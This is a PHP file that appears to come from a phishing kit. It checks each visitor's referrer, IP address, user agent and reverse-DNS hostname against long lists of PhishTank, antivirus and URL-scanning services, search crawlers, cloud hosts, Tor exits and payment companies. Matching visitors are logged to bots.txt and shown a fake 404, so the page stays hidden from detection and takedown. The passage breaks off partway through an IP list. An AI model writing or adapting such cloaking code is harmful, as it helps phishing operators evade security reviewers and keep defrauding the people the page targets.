<?php


include '../string.php';

include '../antifuk.php';

$ip = $_SESSION['ip'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if (isset($_SERVER['HTTP_REFERER'])) {
  if (parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Phishtank ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

if (isset($_SERVER['HTTP_REFERER'])) {
  if (parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Phishtank ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
$range_start = ip2long("146.112.0.0");
$range_end = ip2long("146.112.255.255");
$ip2long = ip2long($_SERVER['REMOTE_ADDR']);

if ($ip2long >= $range_start && $ip2long <= $range_end) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blacklist ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$Bots = array("abot", "dbot", "ebot", "hbot", "kbot", "lbot", "mbot", "nbot", "obot", "pbot", "rbot", "sbot", "tbot", "vbot", "ybot", "zbot", "bot.", "bot/", "_bot", ".bot", "/bot", "-bot", ":bot", "(bot", "crawl", "slurp", "spider", "seek", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "bigbrother", "biglotron", "bjaaland", "blackwidow", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "dieblindekuh", "digger", "ditto", "dmoz", "docomo", "downloadexpress", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3searchengine", "esther", "evliyacelebi", "ezresult", "falcon", "felixide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fishsearch", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hkuwwwoctopus", "homerweb", "htdig", "htmlindex", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspectorweb", "intelliagent", "internetshinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "linkvalidator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsofturlcontrol", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsabeta", "nec-meshexplorer", "nederland.zoek", "netcartawebmapengine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "siteexplorer", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "opentext", "openfind", "openintelligencedata", "orbsearch", "osis-project", "packrat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgpkeyagent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "populariconoclast", "psycheclone", "publisher", "python", "rambler", "ravensearch", "roach", "roadrunner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "sitesearcher", "sitevalet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tachblackwidow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "urlcheck", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "webcore", "webhopper", "webwombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblogmonitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wildferret", "worldlight", "wwwc", "wwwster", "xenu", "xget", "xift", "xirq", "yandex", "yanga", "yeti", "yodao", "zao/", "zippp", "zyborg", "proximic", "Googlebot", "Baiduspider", "Cliqzbot", "A6-Indexer", "AhrefsBot", "Genieo", "BomboraBot", "CCBot", "URLAppendBot", "DomainAppender", "msnbot-media", "Antivirus", "YoudaoBot", "MJ12bot", "linkdexbot", "Go-http-client", "Googlebot", "Baiduspider", "PhantomJS", "applebot", "metauri.com", "Twitterbot", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogouwebspider", "bingbot", "Yahoo!Slurp", "facebookexternalhit", "PrintfulBot", "msnbot", "Twitterbot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimesBot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIXCrawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeercrawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "80legs.com/webcrawler", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly", "bot", "java", "curl", "spider", "crawler");

if (in_array($_SERVER['REMOTE_ADDR'], $Bots)) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$Botname = array( // LIST BOOTS NAME
  "bot",
  "above",
  "google",
  "softlayer",
  "amazonaws",
  "cyveillance",
  "compatible",
  "facebook",
  "phishtank",
  "dreamhost",
  "netpilot",
  "calyxinstitute",
  "tor-exit",
  "apache-httpclient",
  "lssrocketcrawler",
  "Trident",
  "X11",
  "Macintosh",
  "crawler",
  "urlredirectresolver",
  "jetbrains",
  "spam",
  "windows95",
  "windows98",
  "acunetix",
  "netsparker",
  "google",
  "007ac9",
  "008",
  "192.comagent",
  "200pleasebot",
  "360spider",
  "4seohuntbot",
  "50.nu",
  "a6-indexer",
  "admantx",
  "amznkassocbot",
  "aboundexbot",
  "aboutusbot",
  "abravespider",
  "accelobot",
  "acoonbot",
  "addthis.com",
  "adsbot-google",
  "ahrefsbot",
  "alexabot",
  "amagit.com",
  "analytics",
  "antbot",
  "apercite",
  "aportworm",
  "arabot",
  "crawl",
  "slurp",
  "spider",
  "seek",
  "accoona",
  "acoon",
  "adressendeutschland",
  "ah-ha.com",
  "ahoy",
  "altavista",
  "ananzi",
  "anthill",
  "appie",
  "arachnophilia",
  "arale",
  "araneo",
  "aranha",
  "architext",
  "aretha",
  "arks",
  "asterias",
  "atlocal",
  "atn",
  "atomz",
  "augurfind",
  "backrub",
  "bannana_bot",
  "baypup",
  "bdfetch",
  "bigbrother",
  "biglotron",
  "bjaaland",
  "blackwidow",
  "blaiz",
  "blog",
  "blo.",
  "bloodhound",
  "boitho",
  "booch",
  "bradley",
  "butterfly",
  "calif",
  "cassandra",
  "ccubee",
  "cfetch",
  "charlotte",
  "churl",
  "cienciaficcion",
  "cmc",
  "collective",
  "comagent",
  "combine",
  "computingsite",
  "csci",
  "curl",
  "cusco",
  "daumoa",
  "deepindex",
  "delorie",
  "depspid",
  "deweb",
  "dieblindekuh",
  "digger",
  "ditto",
  "dmoz",
  "docomo",
  "downloadexpress",
  "dtaagent",
  "dwcp",
  "ebiness",
  "ebingbong",
  "e-collector",
  "ejupiter",
  "emacs-w3searchengine",
  "esther",
  "evliyacelebi",
  "ezresult",
  "falcon",
  "felixide",
  "ferret",
  "fetchrover",
  "fido",
  "findlinks",
  "fireball",
  "fishsearch",
  "fouineur",
  "funnelweb",
  "gazz",
  "gcreep",
  "genieknows",
  "getterroboplus",
  "geturl",
  "glx",
  "goforit",
  "golem",
  "grabber",
  "grapnel",
  "gralon",
  "griffon",
  "gromit",
  "grub",
  "gulliver",
  "hamahakki",
  "harvest",
  "havindex",
  "helix",
  "heritrix",
  "hkuwwwoctopus",
  "homerweb",
  "htdig",
  "htmlindex",
  "html_analyzer",
  "htmlgobble",
  "hubater",
  "hyper-decontextualizer",
  "ia_archiver",
  "ibm_planetwide",
  "ichiro",
  "iconsurf",
  "iltrovatore",
  "image.kapsi.net",
  "imagelock",
  "incywincy",
  "indexer",
  "infobee",
  "informant",
  "ingrid",
  "inktomisearch.com",
  "inspectorweb",
  "intelliagent",
  "internetshinchakubin",
  "ip3000",
  "iron33",
  "israeli-search",
  "ivia",
  "jack",
  "jakarta",
  "javabee",
  "jetbot",
  "jumpstation",
  "katipo",
  "kdd-explorer",
  "kilroy",
  "knowledge",
  "kototoi",
  "kretrieve",
  "labelgrabber",
  "lachesis",
  "larbin",
  "legs",
  "libwww",
  "linkalarm",
  "linkvalidator",
  "linkscan",
  "lockon",
  "lwp",
  "lycos",
  "magpie",
  "mantraagent",
  "mapoftheinternet",
  "marvin/",
  "mattie",
  "mediafox",
  "mediapartners",
  "mercator",
  "merzscope",
  "microsofturlcontrol",
  "minirank",
  "miva",
  "mj12",
  "mnogosearch",
  "moget",
  "monster",
  "moose",
  "motor",
  "multitext",
  "muncher",
  "muscatferret",
  "mwd.search",
  "myweb",
  "najdi",
  "nameprotect",
  "nationaldirectory",
  "nazilla",
  "ncsabeta",
  "nec-meshexplorer",
  "nederland.zoek",
  "netcartawebmapengine",
  "netmechanic",
  "netresearchserver",
  "netscoop",
  "newscan-online",
  "nhse",
  "nokia6682/",
  "nomad",
  "noyona",
  "nutch",
  "nzexplorer",
  "objectssearch",
  "occam",
  "omni",
  "opentext",
  "openfind",
  "openintelligencedata",
  "orbsearch",
  "osis-project",
  "packrat",
  "pageboy",
  "pagebull",
  "page_verifier",
  "panscient",
  "parasite",
  "partnersite",
  "patric",
  "pear.",
  "pegasus",
  "peregrinator",
  "pgpkeyagent",
  "phantom",
  "phpdig",
  "picosearch",
  "piltdownman",
  "pimptrain",
  "pinpoint",
  "pioneer",
  "piranha",
  "plumtreewebaccessor",
  "pogodak",
  "poirot",
  "pompos",
  "poppelsdorf",
  "poppi",
  "populariconoclast",
  "psycheclone",
  "publisher",
  "python",
  "rambler",
  "ravensearch",
  "roach",
  "roadrunner",
  "roadhouse",
  "robbie",
  "robofox",
  "robozilla",
  "rules",
  "salty",
  "sbider",
  "scooter",
  "scoutjet",
  "scrubby",
  "search.",
  "searchprocess",
  "semanticdiscovery",
  "senrigan",
  "sg-scout",
  "shai'hulud",
  "shark",
  "shopwiki",
  "sidewinder",
  "sift",
  "silk",
  "simmany",
  "sitesearcher",
  "sitevalet",
  "sitetech-rover",
  "skymob.com",
  "sleek",
  "smartwit",
  "sna-",
  "snappy",
  "snooper",
  "sohu",
  "speedfind",
  "sphere",
  "sphider",
  "spinner",
  "spyder",
  "steeler/",
  "suke",
  "suntek",
  "supersnooper",
  "surfnomore",
  "sven",
  "sygol",
  "szukacz",
  "tachblackwidow",
  "tarantula",
  "templeton",
  "/teoma",
  "t-h-u-n-d-e-r-s-t-o-n-e",
  "theophrastus",
  "titan",
  "titin",
  "tkwww",
  "toutatis",
  "t-rex",
  "tutorgig",
  "twiceler",
  "twisted",
  "ucsd",
  "udmsearch",
  "urlcheck",
  "updated",
  "vagabondo",
  "valkyrie",
  "verticrawl",
  "victoria",
  "vision-search",
  "volcano",
  "voyager/",
  "voyager-hc",
  "w3c_validator",
  "w3m2",
  "w3mir",
  "walker",
  "wallpaper",
  "wanderer",
  "wauuu",
  "wavefire",
  "webcore",
  "webhopper",
  "webwombat",
  "webbandit",
  "webcatcher",
  "webcopy",
  "webfoot",
  "weblayers",
  "weblinker",
  "weblogmonitor",
  "webmirror",
  "webmonkey",
  "webquest",
  "webreaper",
  "websitepulse",
  "websnarf",
  "webstolperer",
  "webvac",
  "webwalk",
  "webwatch",
  "webwombat",
  "webzinger",
  "wget",
  "whizbang",
  "whowhere",
  "wildferret",
  "worldlight",
  "wwwc",
  "wwwster",
  "xenu",
  "xift",
  "xirq",
  "yandex",
  "yanga",
  "yeti",
  "yahoo!"
);

foreach ($Botname as $words) {
  if (stripos($_SERVER['HTTP_USER_AGENT'], $words)) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}
if (
  strpos($_SERVER['HTTP_USER_AGENT'], 'google')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Java')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
  or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false
) {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}


$ipsed = $_SERVER['REMOTE_ADDR'];
$IP_Banned = array(
  "^81.161.59.*",
  "^66.135.200.*",
  "^91.103.66.*",
  "^208.91.115.*",
  "^199.30.228.*",
  "^66.102.*.*",
  "^38.100.*.*",
  "^107.170.*.*",
  "^149.20.*.*",
  "^38.105.*.*",
  "^74.125.*.*",
  "^66.150.14.*",
  "^54.176.*.*",
  "^184.173.*.*",
  "^66.249.*.*",
  "^128.242.*.*",
  "^72.14.192.*",
  "^208.65.144.*",
  "^209.85.128.*",
  "^216.239.32.*",
  "^207.126.144.*",
  "^173.194.*.*",
  "^64.233.160.*",
  "^64.18.*.*",
  "^194.52.68.*",
  "^194.72.238.*",
  "^62.116.207.*",
  "^212.50.193.*",
  "^69.65.*.*",
  "^50.7.*.*",
  "^131.212.*.*",
  "^62.90.*.*",
  "^89.138.*.*",
  "^82.166.*.*",
  "^85.64.*.*",
  "^85.250.*.*",
  "^93.172.*.*",
  "^109.186.*.*",
  "^194.90.*.*",
  "^212.29.192.*",
  "^212.29.224.*",
  "^212.143.*.*",
  "^212.150.*.*",
  "^212.235.*.*",
  "^217.132.*.*",
  "^50.97.*.*",
  "^209.85.*.*",
  "^66.205.64.*",
  "^204.14.48.*",
  "^64.27.2.*",
  "^67.15.*.*",
  "^202.108.252.*",
  "^193.47.80.*",
  "^64.62.136.*",
  "^66.221.*.*",
  "^64.62.175.*",
  "^198.54.*.*",
  "^192.115.134.*",
  "^216.252.167.*",
  "^193.253.199.*",
  "^69.61.12.*",
  "^64.37.103.*",
  "^38.144.36.*",
  "^64.124.14.*",
  "^206.28.72.*",
  "^209.73.228.*",
  "^158.108.*.*",
  "^168.188.*.*",
  "^66.207.120.*",
  "^167.24.*.*",
  "^192.118.48.*",
  "^67.209.128.*",
  "^12.148.209.*",
  "^12.148.196.*",
  "^193.220.178.*",
  "68.65.53.71",
  "^198.25.*.*",
  "^64.106.213.*",
  "54.228.218.117",
  "^54.228.218.*",
  "185.28.20.243",
  "^185.28.20.*",
  "217.16.26.166",
  "^217.16.26.*",
  "50.16.241.113",
  "50.16.241.114",
  "50.16.241.117",
  "50.16.247.234",
  "52.204.97.54",
  "52.5.190.19",
  "54.197.234.188",
  "54.208.100.253",
  "23.21.227.69",
  "65.214.45.143",
  "65.214.45.148",
  "66.235.124.192",
  "66.235.124.7",
  "66.235.124.101",
  "66.235.124.193",
  "66.235.124.73",
  "66.235.124.196",
  "66.235.124.74",
  "63.123.238.8",
  "202.143.148.61",
  "66.249.66.1",
  "1.9.2.13",
  "1.9.2.15",
  "62.210.13.58",
  "104.62.2.60",
  "104.83.233.198",
  "107.178.194.64",
  "108.161.29.60",
  "115.238.55.18",
  "119.97.214.138",
  "138.197.207.*",
  "145.239.156.71",
  "145.239.156.89",
  "150.70.168.35",
  "150.70.188.167",
  "154.127.57.30",
  "162.243.128.197",
  "162.243.187.126",
  "162.243.69.215",
  "165.227.0.128",
  "170.250.139.48",
  "138.197.207.147",
  "173.230.147.44",
  "177.39.232.144",
  "178.17.170.156",
  "185.104.186.168",
  "185.220.101.26",
  "185.28.20.243",
  "188.166.63.71",
  "192.36.27.7",
  "196.52.84.81",
  "204.13.201.137",
  "208.87.233.140",
  "212.83.139.219",
  "212.92.117.5",
  "216.164.117.239",
  "217.16.26.166",
  "217.96.188.74",
  "219.117.238.170",
  "23.27.153.247",
  "23.27.154.37",
  "24.23.24.144",
  "27.0.1453.110",
  "3.0.04506.648",
  "3.0.4506.2152",
  "31.168.158.239",
  "34.237.113.113",
  "39.0.2150.5",
  "41.0.2272.118",
  "43.0.2357.81",
  "44.0.2403.155",
  "46.101.94.163",
  "5.62.39.18",
  "5.62.41.35",
  "5.62.56.91",
  "50.112.194.65",
  "50.116.2.167",
  "51.0.2704.103",
  "52.18.11.161",
  "52.192.164.225",
  "52.27.2.86",
  "52.31.63.97",
  "52.5.98.73",
  "52.72.33.140",
  "52.87.10.90",
  "52.91.94.56",
  "53.0.2785.116",
  "54.213.103.141",
  "54.228.218.117",
  "54.245.191.79",
  "56.0.2924.87",
  "57.0.2987.98",
  "61.0.3116.0",
  "62.24.252.133",
  "62.67.194.35",
  "63.0.3239.132",
  "64.0.3282.140",
  "64.0.3282.167",
  "66.0.3358.0",
  "66.0.3359.0",
  "67.0.3360.0",
  "67.0.3361.0",
  "68.65.53.71",
  "75.163.12.85",
  "76.19.184.88",
  "77.69.251.230",
  "80.104.176.17",
  "81.0.48.*",
  "81.0.48.138",
  "84.13.191.239",
  "84.92.148.184",
  "88.99.62.141",
  "217.96.197.246",
  "89.234.157.254",
  "91.231.212.111",
  "173.239.240.147",
  "103.248.172.42",
  "87.113.96.90",
  "165.227.0.128",
  "185.229.190.140",
  "165.227.0.128",
  "46.101.94.163",
  "165.227.39.194",
  "87.113.96.90",
  "46.101.119.24",
  "82.102.27.75",
  "173.239.230.97",
  "82.102.27.75",
  "87.113.96.90",
  "46.101.119.24",
  "173.239.230.97",
  "87.113.96.90",
  "87.113.96.90",
  "159.203.0.156",
  "162.243.187.126",
  "82.102.27.75",
  "87.113.96.90",
  "103.248.172.42",
  "103.248.172.42",
  "47.30.133.89",
  "103.248.172.42"
);

if (in_array($ipsed, $IP_Banned)) {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}
$lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$HOSTNAME = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("drweb", "Dr.Web", "hostinger", "scanurl", "above", "google", "facebook", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "googlebot", "Googlebot-Video", "bingbot", "Baiduspider", "Baiduspider-mobile", "Baiduspider-video", "Baiduspider-image", "NaverBot", "Yeti", "Yandex", "YandexBot", "YandexMobileBot", "YandexVideo", "YandexWebmaster", "YandexSitelinks", "SeznamBot", "AdsBot-Google", "Twitterbot", "Adidxbot", "externalfacebookhit", "Facebot", "Yahoo Pipes 1.0", "facebookexternalhit", "EtaoSpider", "amazon", "netflix", "Slurp", "msnbot", "Applebot", "Googlebot-Image", "teoma", "ia_archiver", "YandexDirect", "gsa-crawler", "OmniExplorer_Bot", "msnbot-mobile", "YahooSeeker", "SPRO-NET-206-80-96", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "LVLT-STATIC-4-14-16", "americanexpress", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "paypal");

foreach ($blocked_words as $word) {
  if (substr_count($HOSTNAME, $word) > 0) {
    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bad word ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("teledata-fttx.de", "hicoria.com", "simtccflow1.etn.com", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "duckduck", "feedfetcher", "BitDefender", "mcafee", "antivirus", "cloudflare", "p3pwgdsn", "avg", "avira", "avast", "ovh.net", "security", "twitter", "bitdefender", "virustotal", "phising", "clamav", "baidu", "safebrowsing", "eset", "mailshell", "azure", "miniature", "tlh.ro", "aruba", "dyn.plus.net", "pagepeeker", "SPRO-NET-207-70-0", "SPRO-NET-209-19-128", "vultr", "colocrossing.com", "geosr", "drweb", "dr.web", "linode.com", "opendns", 'cymru.com', 'sl-reverse.com', 'surriel.com', 'hosting', 'orange-labs', 'speedtravel', 'metauri', 'apple.com', 'bruuk.sk', 'sysms.net', 'oracle', 'cisco', 'amuri.net', "versanet.de", "hilfe-veripayed.com", "googlebot.com", "upcloud.host", "nodemeter.net", "e-active.nl", "downnotifier", "online-domain-tools", "fetcher6-2.go.mail.ru", "uptimerobot.com", "monitis.com", "colocrossing.com", "majestic12", "as9105.com", "btcentralplus.com", "anonymizing-proxy", "digitalcourage.de", "triolan.net", "staircaseirony", "stelkom.net", "comrise.ru", "kyivstar.net", "mpdedicated.com", "starnet.md", "progtech.ru", "hinet.net", "is74.ru", "shore.net", "cyberinfo", "ipredator", "unknown.telecom.gomel.by", "minsktelecom.by", "parked.factioninc.com");

foreach ($blocked_words as $word) {
  if (substr_count($hostname, $word) > 0) {

    $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Blocked ] \r\n";
    $save = fopen("../../bots.txt", "a+");
    fwrite($save, $content);
    fclose($save);
    header("HTTP/1.0 404 Not Found");
    exit();

  }
}

$bannedIP = array("66.249.91.*", "66.249.91.203", "^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*", "^84.93.84.*", "^182.75.120.*", "^182.75.120.10", "^46.101.43.*", "^147.75.210.*");
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();


} else {
  foreach ($bannedIP as $ip) {
    if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
      $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Banned ] \r\n";
      $save = fopen("../../bots.txt", "a+");
      fwrite($save, $content);
      fclose($save);
      header("HTTP/1.0 404 Not Found");
      exit();


    }
  }
}


$v_agent = $_SERVER['HTTP_USER_AGENT'];
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {

  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
  $content = "#> " . $_SERVER['HTTP_USER_AGENT'] . " [ Bot ] \r\n";
  $save = fopen("../../bots.txt", "a+");
  fwrite($save, $content);
  fclose($save);
  header("HTTP/1.0 404 Not Found");
  exit();

}

$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
  "^94.26.*.*",
  "^95.85.*.*",
  "^72.52.96.*",
  "^212.8.79.*",
  "^62.99.77.*",
  "^83.31.118.*",
  "^91.231.*.*",
  "^206.207.*.*",
  "^91.231.212.*",
  "^62.99.77.*",
  "^198.41.243.*",
  "^162.158.*.*",
  "^162.158.7.*",
  "^162.158.72.*",
  "^173.245.55.*",
  "^108.162.246.*",
  "^162.158.95.*",
  "^108.162.215.*",
  "^95.108.194.*",
  "^141.101.104.*",
  "^93.54.82.*",
  "^69.164.145.*",
  "^194.153.113.*",
  "^178.43.117.*",
  "^62.141.65.*",
  "^83.31.69.*",
  "^107.178.195.*",
  "^149.20.54.*",
  "^85.9.7.*",
  "^87.106.251.*",
  "^107.178.194.*",
  "^124.66.185.*",
  "^133.11.204.*",
  "^185.2.138.*",
  "^188.165.83.*",
  "^78.148.13.*",
  "^192.232.213.*",
  "^1.234.41.*",
  "^124.66.185.*",
  "^87.106.251.*",
  "^176.195.231.*",
  "^206.253.226.*",
  "^107.20.181.*",
  "^188.244.39.*",
  "^124.66.185.*",
  "^38.74.138.*",
  "^124.66.185.*",
  "^38.74.138.*",
  "^206.253.226.*",
  "^1.234.41.*",
  "^124.66.185.*",
  "^87.106.251.*",
  "^85.9.7.*",
  "^37.140.188.*",
  "^195.128.227.*",
  "^38.74.138.*",
  "^107.20.181.*",
